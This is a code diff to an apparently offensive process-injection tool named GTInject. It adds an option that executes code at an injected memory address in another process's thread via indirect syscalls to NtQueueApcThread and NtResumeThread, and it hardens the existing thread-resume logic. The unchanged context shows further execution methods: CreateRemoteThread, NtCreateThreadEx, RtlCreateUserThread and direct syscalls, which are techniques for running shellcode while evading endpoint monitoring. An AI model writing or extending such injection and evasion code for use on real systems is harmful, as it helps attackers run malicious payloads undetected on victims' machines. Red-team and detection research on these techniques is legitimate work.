@@ -7,6 +7,7 @@ using static GTInject.memoryOptions.memory;
 using System.Net.Http;
 using System.Xml.Linq;
 using GTInject.SysCalls;
+using System.Linq.Expressions;
 
 namespace GTInject.Injection
 {
@@ -32,6 +33,8 @@ namespace GTInject.Injection
                     return execopt301(memaddr, pid, tid);
                 case 302:
                     return execopt302(memaddr, pid, tid);
+                case 303:
+                    return execopt303(memaddr, pid, tid);
                 default:
                     Console.WriteLine( "[-] Not a valid Thread Execution option integer");
                     return IntPtr.Zero;
@@ -50,7 +53,7 @@ namespace GTInject.Injection
             IntPtr remoteThreadResp = CreateRemoteThread(ProcID.Handle, (IntPtr)0, 0, memaddr, (IntPtr)0, 0, (IntPtr)0);
             if (remoteThreadResp != IntPtr.Zero)
             {
-                Console.WriteLine("[+] WinAPI CreateRemoteThread with response : " + remoteThreadResp);
+                Console.WriteLine("[+] WinAPI CreateRemoteThread with response : " + remoteThreadResp + "\n");
 
             }
             return remoteThreadResp;
@@ -77,25 +80,34 @@ namespace GTInject.Injection
             }
             else
             {
-                Console.WriteLine("[+] WinAPI QueueUserAPC called");
+                Console.WriteLine("[+] WinAPI QueueUserAPC called\n");
 
                 var threadObjects = ProcID.Threads;
                 for (int i = 0; i < threadObjects.Count; i++)
                 {
-                    if (threadObjects[i].Id == ThreadID && threadObjects[i].WaitReason.ToString() == "Suspended")
+                    try
                     {
-                        Console.WriteLine("     thread is suspended, so calling resume Thread WINAPI on this");
-                        var ResThreadResp = ResumeThread(threadHandle);
-                        if (ResThreadResp == -1)
+                        if (threadObjects[i].Id == ThreadID && threadObjects[i].WaitReason.ToString() == "Suspended")
                         {
-                            Console.WriteLine("     resume Thread failed");
-                            return IntPtr.Zero;
-                        }
-                        else
-                        {
-                            Console.WriteLine("[+] WinAPI ResumeThread called");
+                            Console.WriteLine("     thread is suspended, so calling resume Thread WINAPI on this");
+                            var ResThreadResp = ResumeThread(threadHandle);
+                            if (ResThreadResp == -1)
+                            {
+                                Console.WriteLine("     resume Thread failed");
+                                return IntPtr.Zero;
+                            }
+                            else
+                            {
+                                Console.WriteLine("[+] WinAPI ResumeThread called\n");
+                            }
                         }
                     }
+                    catch (System.InvalidOperationException e)
+                    {
+                        Console.WriteLine("     Check for injection, we caught an error, but it likely means that we attempted to resume a thread that already executed");
+                        Console.WriteLine("     " + e.Message);
+                    }
+
                 }
                 return threadHandle; // returning an IntPtr, threadhandle is already an IntPtr
             }
@@ -117,7 +129,7 @@ namespace GTInject.Injection
 
             IntPtr hRemoteThread;
             uint hThread = NtCreateThreadEx(out hRemoteThread, 0x1FFFFF, IntPtr.Zero, ProcID.Handle, memaddr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
-            Console.WriteLine("[+] NTAPI NtCreateThreadEx with response : " + hThread);
+            Console.WriteLine("[+] NTAPI NtCreateThreadEx with response : " + hThread + "\n");
 
             return hRemoteThread;
         }
@@ -133,7 +145,7 @@ namespace GTInject.Injection
             int hthread = RtlCreateUserThread(ProcID.Handle, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, memaddr, IntPtr.Zero, ref targetThread, ref id);
             if (hthread == 0)
             {
-                Console.WriteLine("[+] NTAPI RtlCreateUserThread resp : " + hthread);
+                Console.WriteLine("[+] NTAPI RtlCreateUserThread resp : " + hthread + "\n");
                 return targetThread;
             }
             else
@@ -173,22 +185,35 @@ namespace GTInject.Injection
             }
             else
             {
-                Console.WriteLine("[+] NTAPI NtQueueApcThread called");
+                Console.WriteLine("[+] NTAPI NtQueueApcThread called\n");
                 var threadObjects = ProcID.Threads;
-                for (int i = 0; i < threadObjects.Count; i++)
+
+                try
                 {
-                    if (threadObjects[i].Id == ThreadID && threadObjects[i].WaitReason.ToString() == "Suspended")
+                    for (int i = 0; i < threadObjects.Count; i++)
                     {
-                        Console.WriteLine("     thread is suspended, so calling NtResumeThread on this");
-                        var ntResTResp = NtResumeThread(targetThread, 0);
-                        if (ntResTResp != 0)
+                        if (threadObjects[i].Id == ThreadID && threadObjects[i].WaitReason.ToString() == "Suspended")
                         {
-                            Console.WriteLine("     resume Thread failed");
-                            return IntPtr.Zero;
+                            Console.WriteLine("     thread is suspended, so calling NtResumeThread on this");
+                            var ntResTResp = NtResumeThread(targetThread, 0);
+                            if (ntResTResp != 0)
+                            {
+                                Console.WriteLine("     resume Thread failed");
+                                return IntPtr.Zero;
+                            }
+                            else
+                            {
+                                Console.WriteLine("[+] NTAPI NtResumeThread called\n");
+                            }
                         }
                     }
                 }
-                Console.WriteLine("[+] NTAPI NtQueueApcThread called");
+
+                catch (System.InvalidOperationException e)
+                {
+                    Console.WriteLine("     Check for injection, we caught an error, but it likely means that we attempted to resume a thread that already executed");
+                    Console.WriteLine("     " + e.Message);
+                }
                 return targetThread; // returning an IntPtr, threadhandle is already an IntPtr
             }
         }
@@ -205,7 +230,7 @@ namespace GTInject.Injection
 
             if (status == WinNative.NTSTATUS.Success)
             {
-                Console.WriteLine("[+] Direct Syscall to NtCreateThreadEx " + status);
+                Console.WriteLine("[+] Direct Syscall to NtCreateThreadEx " + status + "\n");
                 return memaddr;
             }
             else
@@ -239,24 +264,34 @@ namespace GTInject.Injection
             }
             else
             {
-                Console.WriteLine("[+] Direct Syscall NtQueueApcThread called");
+                Console.WriteLine("[+] Direct Syscall NtQueueApcThread called\n");
                 var threadObjects = ProcID.Threads;
                 for (int i = 0; i < threadObjects.Count; i++)
                 {
-                    if (threadObjects[i].Id == ThreadID && threadObjects[i].WaitReason.ToString() == "Suspended")
+                    try
                     {
-                        Console.WriteLine("     thread is suspended, so calling Direct Syscall NtResumeThread on this");
-                        var ntResTResp = Syscalls.SysclNtResumeThread(targetThread, 0);
-                        if (ntResTResp != 0)
+                        if (threadObjects[i].Id == ThreadID && threadObjects[i].WaitReason.ToString() == "Suspended")
                         {
-                            Console.WriteLine("     Direct Syscall NtResumeThread failed");
-                            return IntPtr.Zero;
-                        }
-                        else
-                        {
-                            Console.WriteLine("[+] Direct Syscall NtResumeThread called");
+                            Console.WriteLine("     thread is suspended, so calling Direct Syscall NtResumeThread on this");
+                            var ntResTResp = Syscalls.SysclNtResumeThread(targetThread, 0);
+                            if (ntResTResp != 0)
+                            {
+                                Console.WriteLine("     Direct Syscall NtResumeThread failed");
+                                return IntPtr.Zero;
+                            }
+                            else
+                            {
+                                Console.WriteLine("[+] Direct Syscall NtResumeThread called\n");
+                            }
                         }
                     }
+                    catch (System.InvalidOperationException e)
+                    {
+                        Console.WriteLine("     Check for injection, we caught an error, but it likely means that we attempted to resume a thread that already executed");
+                        Console.WriteLine("     " + e.Message);
+                    }
+
+
                 }
                 return targetThread; // returning an IntPtr, threadhandle is already an IntPtr
             }
@@ -276,7 +311,7 @@ namespace GTInject.Injection
 
             if (status == WinNative.NTSTATUS.Success)
             {
-                Console.WriteLine("[+] Indirect Syscall to CreateThread " + status);
+                Console.WriteLine("[+] Indirect Syscall to CreateThread " + status + "\n");
 
                 return memaddr;
             }
@@ -286,6 +321,63 @@ namespace GTInject.Injection
             }
 
         }
+
+        private static IntPtr execopt303(IntPtr memaddr, Process ProcID, int ThreadID)
+        {
+            /////////////////////////////////////
+            // OPTION 303 == Indirect Syscall - NtQueueApcThread, NtResumeThread
+            /////////////////////////////////////
+
+            var targetThread = OpenThread(0x001F03FF, false, (uint)ThreadID);//0x40000000, false, (uint)threadId);
+
+            // set up the syscall for NtQueueApcThread
+            var hProcess = ProcID.Handle;
+            IntPtr hThread = IntPtr.Zero;
+            var status = Syscalls.IndirectSysclNtQueueApcThread(targetThread, memaddr, 0, IntPtr.Zero, 0);
+            Console.WriteLine("     Indirect Syscall to NtQueueApcThread " + status);
+
+            if (status != 0)
+            {
+                Console.WriteLine("     QAPCThread Indirect Syscall was non-success");
+                return IntPtr.Zero;
+            }
+            else
+            {
+                Console.WriteLine("[+] Indirect Syscall NtQueueApcThread called\n");
+                var threadObjects = ProcID.Threads;
+                for (int i = 0; i < threadObjects.Count; i++)
+                {
+                    try
+                    {
+                        if (threadObjects[i].Id == ThreadID && threadObjects[i].WaitReason.ToString() == "Suspended")
+                        {
+                            Console.WriteLine("     thread is suspended, so calling Indirect Syscall NtResumeThread on this");
+                            var ntResTResp = Syscalls.IndirectSysclNtResumeThread(targetThread, 0);
+                            if (ntResTResp != 0)
+                            {
+                                Console.WriteLine("     Indirect Syscall NtResumeThread failed");
+                                return IntPtr.Zero;
+                            }
+                            else
+                            {
+                                Console.WriteLine("[+] Indirect Syscall NtResumeThread called\n");
+                            }
+                        }
+                    } 
+                    catch (System.InvalidOperationException e)
+                    {
+                        Console.WriteLine("     Check for injection, we caught an error, but it likely means that we attempted to resume a thread that already executed");
+                        Console.WriteLine("     " + e.Message);
+
+                    }
+
+                }
+                return targetThread; // returning an IntPtr, threadhandle is already an IntPtr
+            }
+
+        }
+
+
 
         /////////////////////////////////////
         // Supporting functions
